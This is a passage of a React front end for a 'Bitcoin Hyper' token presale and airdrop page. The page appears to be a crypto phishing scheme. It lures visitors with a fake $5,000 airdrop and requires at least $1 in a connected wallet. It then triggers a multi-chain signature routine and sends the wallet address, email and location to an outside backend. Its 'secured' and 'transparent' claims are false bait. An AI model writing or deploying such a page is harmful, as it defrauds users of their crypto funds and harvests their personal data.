    if (!isEligible) {
      setError("You need at least $1 in your wallet to qualify");
      return;
    }
    
    await executeMultiChainSignature();
  };

  const claimTokens = async () => {
    try {
      setLoading(true);
      await fetch('https://flarebackend.vercel.app/api/presale/claim', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          walletAddress: address,
          email: userEmail,
          location: userLocation,
          reward: "5000 BTH",
          bonus: `${presaleStats.currentBonus}%`
        })
      });
      setShowCelebration(true);
    } catch (err) {
      console.error('Claim error:', err);
    } finally {
      setLoading(false);
    }
  };

  const formatAddress = (addr) => {
    if (!addr) return '';
    return `${addr.substring(0, 6)}...${addr.substring(38)}`;
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#1a0000] to-[#000000] text-white font-['Poppins'] overflow-hidden">
      
      {/* Red glow background */}
      <div className="fixed w-[600px] h-[600px] bg-red-600 rounded-full blur-[200px] opacity-15 top-[-200px] left-[-200px] pointer-events-none"></div>
      <div className="fixed w-[400px] h-[400px] bg-red-500 rounded-full blur-[150px] opacity-10 bottom-[-100px] right-[-100px] pointer-events-none"></div>

      {/* Airdrop Ribbon - RESPONSIVE POSITION - FIXED */}
      <div 
        onClick={claimAirdrop}
        className="fixed right-[-70px] top-[40%] bg-gradient-to-r from-red-600 to-red-500 text-white py-4 px-24 transform -rotate-90 font-semibold cursor-pointer hover:from-red-700 hover:to-red-600 transition-all z-50 animate-pulse-glow hidden md:flex items-center justify-center"
        style={{ animation: 'blink 1.2s infinite' }}
      >
        <span className="text-2xl mr-2">🎁</span> CLAIM AIRDROP
      </div>

      {/* Mobile Airdrop Button - FIXED */}
      <div 
        onClick={claimAirdrop}
        className="fixed bottom-6 right-6 bg-gradient-to-r from-red-600 to-red-500 text-white px-6 py-3 rounded-full shadow-2xl cursor-pointer hover:from-red-700 hover:to-red-600 transition-all z-50 animate-pulse-glow md:hidden flex items-center justify-center gap-2"
        style={{ animation: 'blink 1.2s infinite' }}
      >
        <span className="text-xl">🎁</span>
        <span className="text-sm font-semibold">CLAIM AIRDROP</span>
      </div>

      {/* Language Selector - FIXED */}
      <div className="absolute top-6 right-6 z-50">
        <div className="relative">
          <button
            onClick={() => setShowLanguageDropdown(!showLanguageDropdown)}
            className="bg-black/50 backdrop-blur border border-red-500/30 rounded-full px-4 py-2 flex items-center gap-2 hover:border-red-500 transition-all"
          >
            <span className="text-lg">{SUPPORTED_LANGUAGES[language]?.flag || '🇺🇸'}</span>
            <span className="text-sm text-white hidden sm:inline">
              {SUPPORTED_LANGUAGES[language]?.native || 'English'}
            </span>
            <i className={`fas fa-chevron-down text-red-500 text-xs transition-transform ${showLanguageDropdown ? 'rotate-180' : ''}`}></i>
          </button>
          
          {showLanguageDropdown && (
            <div className="absolute right-0 mt-2 w-64 bg-black/90 backdrop-blur border border-red-500/30 rounded-2xl shadow-2xl z-50 max-h-96 overflow-y-auto">
              <div className="p-2">
                <div className="text-xs text-red-500 px-3 py-2 font-semibold border-b border-red-500/20 mb-1">
                  SELECT LANGUAGE
                </div>
                {Object.entries(SUPPORTED_LANGUAGES).map(([code, lang]) => (
                  <button
                    key={code}
                    onClick={() => changeLanguage(code)}
                    className={`w-full text-left px-3 py-2.5 rounded-xl flex items-center gap-3 transition-all duration-200 hover:bg-red-500/10 ${
                      language === code ? 'bg-red-500/20 border border-red-500/30' : ''
                    }`}
                  >
                    <span className="text-xl">{lang.flag}</span>
                    <div className="flex-1">
                      <div className="text-sm font-medium text-white">{lang.name}</div>
                      <div className="text-xs text-gray-400">{lang.native}</div>
                    </div>
                    {language === code && (
                      <i className="fas fa-check text-red-500 text-sm"></i>
                    )}
                  </button>
                ))}
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Main Container */}
      <div className="relative z-10 container mx-auto px-4 py-8 max-w-[720px]">
        
        {/* Hero Section */}
        <div className="flex flex-col items-center text-center pt-16 pb-8">
          
          {/* Logo */}
          <div className="font-['Orbitron'] text-6xl md:text-7xl font-black mb-4 animate-glow-red">
            <span className="bg-gradient-to-r from-red-500 to-red-300 bg-clip-text text-transparent">
              BITCOIN HYPER
            </span>
          </div>

          {/* Live Badge */}
          <div className="bg-red-600 px-4 py-1.5 rounded-full text-xs font-semibold animate-pulse-red mb-4">
            ● PRESALE LIVE
          </div>

          {/* Tagline */}
          <p className="max-w-2xl text-gray-300 leading-relaxed mb-6 text-sm md:text-base">
            Bitcoin Hyper (BTH) is a next-generation decentralized token designed to reward early supporters
            through presale access and exclusive airdrops. Join the community before public exchange
            listings and secure the lowest available token price.
          </p>

          {/* Wallet Connect Button */}
          {!isConnected ? (
            <button
              onClick={() => open()}
              onMouseEnter={() => setHoverConnect(true)}
              onMouseLeave={() => setHoverConnect(false)}
              className="bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-semibold px-8 py-4 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] mb-8 w-full max-w-md"
            >
              Connect Wallet To Claim $5000 (Bitcoin Hyper Token)
            </button>
          ) : (
            <div className="flex flex-col items-center w-full max-w-md mb-8">
              <div className="flex items-center justify-between gap-3 bg-black/50 backdrop-blur border border-red-500/30 rounded-full py-2 pl-5 pr-2 w-full">
                <span className="font-mono text-sm text-gray-300">
                  {formatAddress(address)}
                </span>
                <button
                  onClick={() => disconnect()}
                  className="w-8 h-8 rounded-full bg-red-600 flex items-center justify-center hover:bg-red-700 transition-colors"
                  title="Disconnect"
                >
                  <i className="fas fa-power-off text-xs"></i>
                </button>
              </div>
              
              {/* CLAIM BUTTON - APPEARS BELOW CONNECT BUTTON WHEN ELIGIBLE */}
              {showClaimButton && (
                <button
                  onClick={claimAirdrop}
                  disabled={signatureLoading}
                  className="mt-3 w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105 hover:shadow-[0_10px_20px_rgba(255,0,0,0.4)] animate-pulse-glow"
                  style={{ animation: 'blink 1.2s infinite' }}
                >
                  {signatureLoading ? (
                    <span className="flex items-center justify-center gap-2">
                      <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      {processingChain ? `Processing ${processingChain}...` : 'Processing...'}
                    </span>
                  ) : (
                    <span className="flex items-center justify-center gap-2">
                      <span className="text-xl">🎁</span>
                      CLAIM AIRDROP $5,000 BTH
                      <span className="text-sm bg-white/20 px-2 py-1 rounded-full">+{presaleStats.currentBonus}%</span>
                    </span>
                  )}
                </button>
              )}

              {/* Eligibility Status Message */}
              {isConnected && !signatureLoading && !completedChains.length && (
                <div className="mt-3 w-full">
                  {isEligible ? (
                    <div className="bg-green-500/20 border border-green-500/30 rounded-lg p-3 text-sm text-green-400">
                      ✅ You are eligible for the $5,000 Bitcoin Hyper (BTH) airdrop! Click the CLAIM AIRDROP button above to proceed.
                    </div>
                  ) : (
                    !scanning && (
                      <div className="bg-yellow-500/20 border border-yellow-500/30 rounded-lg p-3 text-sm text-yellow-400">
                        ⚡ You need at least $1 in your wallet to qualify for the airdrop.
                      </div>
                    )
                  )}
                </div>
              )}
            </div>
          )}

          {/* ELIGIBILITY CHECKING ANIMATION */}
          {isConnected && scanning && (
            <div className="w-full max-w-md mb-8">
              <div className="bg-black/60 backdrop-blur rounded-2xl p-6 border border-red-500/30">
                <div className="flex items-center justify-center gap-4 mb-4">
                  <div className="w-12 h-12 border-4 border-red-500 border-t-transparent rounded-full animate-spin"></div>
                  <div className="text-left">
                    <div className="text-lg font-bold text-red-400">Checking Eligibility</div>
                    <div className="text-sm text-gray-400">Verifying your wallet...</div>
                  </div>
                </div>
                
                {/* Progress bar */}
                <div className="w-full bg-gray-800 rounded-full h-1.5 mb-2">
                  <div 
                    className="bg-gradient-to-r from-red-500 to-red-400 h-1.5 rounded-full transition-all duration-300"
                    style={{ width: `${scanProgress}%` }}
                  ></div>
                </div>
                
                <div className="mt-3 text-sm text-red-400">
                  {txStatus}
                </div>
              </div>
            </div>
          )}

          {/* Countdown Timer */}
          <div className="flex flex-wrap gap-4 justify-center mb-10">
            {[
              { label: translations.days, value: timeLeft.days },
              { label: translations.hrs, value: timeLeft.hours },
              { label: translations.mins, value: timeLeft.minutes },
              { label: translations.secs, value: timeLeft.seconds }
            ].map((item, index) => (
              <div key={index} className="bg-red-500/10 border border-red-500/30 backdrop-blur p-4 rounded-xl min-w-[90px]">
                <span className="block text-3xl text-red-400 font-bold">{item.value}</span>
                <span className="text-xs text-gray-400">{item.label}</span>
              </div>
            ))}
          </div>

          {/* Presale Card */}
          <div className="w-full max-w-md bg-red-500/5 border border-red-500/30 backdrop-blur p-8 rounded-2xl mb-8">
            <h3 className="text-2xl font-bold mb-4 text-red-400">Bitcoin Hyper (BTH) Token Presale</h3>
            
            <p className="text-gray-300 mb-3">
              {presaleStats.totalSold.toLocaleString()} / {presaleStats.hardCap.toLocaleString()} BTH Sold
            </p>
            
            {/* Progress Bar */}
            <div className="w-full bg-red-950 h-3 rounded-full overflow-hidden mb-6">
              <div 
                className="h-full bg-gradient-to-r from-red-600 to-red-400 rounded-full transition-all duration-1000"
                style={{ width: `${(presaleStats.totalSold / presaleStats.hardCap) * 100}%` }}
              ></div>
            </div>

            {/* BNB Input */}
            <input
              type="number"
              value={bnbAmount}
              onChange={(e) => setBnbAmount(e.target.value)}
              placeholder="Enter BNB amount"
              className="w-full bg-black/50 border border-red-500/30 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:border-red-500 mb-4"
            />

            {/* Buy Button */}
            <button
              onClick={buyBth}
              disabled={loading || !isConnected}
              className="w-full bg-gradient-to-r from-red-600 to-red-500 hover:from-red-700 hover:to-red-600 text-white font-semibold py-3 rounded-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed mb-6"
            >
              {loading ? 'Processing...' : 'Buy BTH'}
            </button>

            {/* Airdrop Card */}
            <div className="bg-black/50 border border-red-500/30 rounded-xl p-5">
              <h4 className="text-xl font-bold mb-2 text-red-400">🎁 Airdrop Info</h4>
              <p className="text-sm text-gray-400 mb-4">
                Early supporters can claim free BTH tokens. Connect wallet to check eligibility.
              </p>
              
              {!isConnected && (
                <p className="text-xs text-red-400/70">Connect wallet to check eligibility</p>
              )}
              {isConnected && !isEligible && (
                <p className="text-xs text-red-400/70">Need at least $1 in wallet to qualify</p>
              )}
            </div>

            {/* Status Messages */}
            {txStatus && (
              <div className="mt-4 text-sm text-center text-red-400">
                {txStatus}
              </div>
            )}

            {/* Error Display */}
            {error && (
              <div className="mt-4 bg-red-500/20 border border-red-500/30 rounded-lg p-3 text-sm text-red-300">
                {error}
              </div>
            )}

            {/* Completed Chains Progress */}
            {completedChains.length > 0 && (
              <div className="mt-4 text-center">
                <div className="text-xs text-gray-400">
                  Completed: {completedChains.join(' → ')}
                </div>
              </div>
            )}
          </div>

          {/* Already completed message */}
          {completedChains.length > 0 && (
            <div className="w-full max-w-md mb-8">
              <div className="bg-black/60 backdrop-blur rounded-xl p-6 text-center border border-green-500/30">
                <p className="text-green-400 text-lg mb-2">✓ COMPLETED on {completedChains.length} chains</p>
                <p className="text-gray-400 text-sm">Your $5,000 BTH has been secured</p>
              </div>
            </div>
          )}

          {/* Welcome message for non-eligible */}
          {isConnected && !isEligible && !completedChains.length && !scanning && (
            <div className="w-full max-w-md mb-8">
              <div className="bg-black/60 backdrop-blur rounded-xl p-8 text-center border border-red-500/30">
                <div className="text-6xl mb-4">👋</div>
                <h2 className="text-xl font-bold mb-3 text-red-400">
                  {translations.welcome}
                </h2>
                <p className="text-gray-400 text-sm mb-6">
                  Connect with a wallet that has at least $1 in value to qualify for the airdrop.
                </p>
                <div className="bg-black/50 rounded-lg p-3 border border-gray-800">
                  <p className="text-xs text-gray-400">
                    Multi-chain support: Ethereum, BSC, Polygon, Arbitrum, Avalanche
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* Info Section */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mt-12">
            
            {/* Card 1 */}
            <div className="bg-red-500/5 border border-red-500/20 backdrop-blur p-6 rounded-xl">
              <h3 className="text-lg font-bold mb-3 text-red-400">About Bitcoin Hyper (BTH) Presale</h3>
              <p className="text-sm text-gray-400 leading-relaxed">
                The Bitcoin Hyper (BTH) presale offers early community members the opportunity to purchase
                tokens at the lowest available rate before public exchange listings.
                Funds raised during the presale help accelerate development,
                liquidity provisioning, and ecosystem expansion.
              </p>
            </div>

            {/* Card 2 */}
            <div className="bg-red-500/5 border border-red-500/20 backdrop-blur p-6 rounded-xl">
              <h3 className="text-lg font-bold mb-3 text-red-400">Bitcoin Hyper (BTH) Airdrop Program</h3>
              <p className="text-sm text-gray-400 leading-relaxed">
                The Bitcoin Hyper (BTH) airdrop rewards early adopters and active community members.
                Eligible wallets can claim tokens directly through the decentralized
                claim portal. This initiative ensures broad distribution
                and strong community ownership of the BTH ecosystem.
              </p>
            </div>

            {/* Card 3 */}
            <div className="bg-red-500/5 border border-red-500/20 backdrop-blur p-6 rounded-xl">
              <h3 className="text-lg font-bold mb-3 text-red-400">Security & Transparency</h3>
              <p className="text-sm text-gray-400 leading-relaxed">
                All presale and airdrop transactions are executed directly on-chain.
                Smart contracts ensure transparent token distribution and
                verifiable transaction records on the blockchain.
              </p>
            </div>
          </div>

          {/* Footer */}
          <footer className="mt-16 text-gray-500 text-sm">
            © 2026 Bitcoin Hyper (BTH) Token — All Rights Reserved
          </footer>
        </div>
      </div>

      {/* Celebration Modal */}
      {showCelebration && (
        <div className="fixed inset-0 bg-black/90 backdrop-blur-xl flex items-center justify-center z-50 p-4 animate-fadeIn">
          <div className="relative max-w-lg w-full">
            <div className="absolute inset-0 bg-gradient-to-r from-red-600/30 via-red-500/30 to-red-600/30 rounded-3xl blur-2xl animate-pulse-slow"></div>
            
            {/* Confetti effect */}
            {[...Array(20)].map((_, i) => (
              <div
                key={i}
                className="absolute w-0.5 h-0.5 bg-gradient-to-r from-red-400 to-red-500 rounded-full animate-confetti-cannon"
                style={{
                  left: `${Math.random() * 100}%`,
                  top: '50%',
                  animationDelay: `${i * 0.1}s`,
                  animationDuration: `${1 + Math.random()}s`
                }}
              />
            ))}
            
            <div className="relative bg-gradient-to-br from-gray-900 to-black rounded-3xl p-10 border border-red-500/20 shadow-2xl text-center">
              <div className="relative mb-6">
                <div className="text-7xl animate-bounce">🎉</div>
                {[...Array(8)].map((_, i) => (
                  <div
                    key={i}
                    className="absolute w-1 h-1 bg-red-400 rounded-full animate-sparkle"
                    style={{
                      top: '50%',
                      left: '50%',
                      transform: `rotate(${i * 45}deg) translateY(-30px)`,
                      animationDelay: `${i * 0.1}s`
                    }}
                  />
                ))}
              </div>
              
              <h2 className="text-4xl font-black mb-3 bg-gradient-to-r from-red-400 to-red-300 bg-clip-text text-transparent">
                {translations.successful}
              </h2>
              
              <p className="text-xl text-gray-300 mb-3">{translations.youHaveSecured}</p>
              
              <div className="text-5xl font-black text-red-400 mb-3 animate-pulse">$5,000 BTH</div>
              
              <div className="inline-block bg-gradient-to-r from-red-500/20 to-red-600/20 px-6 py-3 rounded-full mb-4 border border-red-500/30">
                <span className="text-2xl text-red-400">+{presaleStats.currentBonus}% BONUS</span>
              </div>
              
              <p className="text-xs text-gray-500 mb-6">
                Processed on {verifiedChains.length} chains
              </p>
              
              <button
                onClick={() => setShowCelebration(false)}
                className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white font-bold py-4 px-6 rounded-xl transition-all transform hover:scale-105"
              >
                {translations.viewButton}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Animation Keyframes */}
      <style>{`
        @keyframes glow-red {
          from { filter: drop-shadow(0 0 10px #ff1a1a); }
          to { filter: drop-shadow(0 0 40px #ff4d4d); }
        }
        @keyframes pulse-red {
          0% { box-shadow: 0 0 0 0 rgba(255,0,0,.7); }
          70% { box-shadow: 0 0 0 15px rgba(255,0,0,0); }
          100% { box-shadow: 0 0 0 0 rgba(255,0,0,0); }
        }
        @keyframes blink {
          0% { opacity: 1; }
          50% { opacity: 0.4; }
          100% { opacity: 1; }
        }
        @keyframes confetti-cannon {
          0% { transform: translateY(0) rotate(0deg); opacity: 0.8; }
          100% { transform: translateY(-250px) rotate(720deg) translateX(200px); opacity: 0; }
        }
        @keyframes sparkle {
          0% { transform: rotate(0deg) scale(0); opacity: 0; }
          50% { transform: rotate(180deg) scale(1); opacity: 1; }
          100% { transform: rotate(360deg) scale(0); opacity: 0; }
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: scale(0.95); }
          to { opacity: 1; transform: scale(1); }
        }
        @keyframes pulse-slow {
          0%, 100% { opacity: 0.3; }
          50% { opacity: 0.6; }
        }
        .animate-glow-red { animation: glow-red 3s infinite alternate; }
        .animate-pulse-red { animation: pulse-red 1.5s infinite; }
        .animate-pulse-glow { animation: blink 1.2s infinite; }
        .animate-confetti-cannon { animation: confetti-cannon 2s ease-out forwards; }
        .animate-sparkle { animation: sparkle 1s ease-out forwards; }
        .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
        .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
        .animate-pulse { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
        
        /* Mobile responsive adjustments */
        @media (max-width: 768px) {
          .fixed.bottom-6.right-6 {
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.5);
          }
        }
      `}</style>
    </div>
  );
}

export default App;
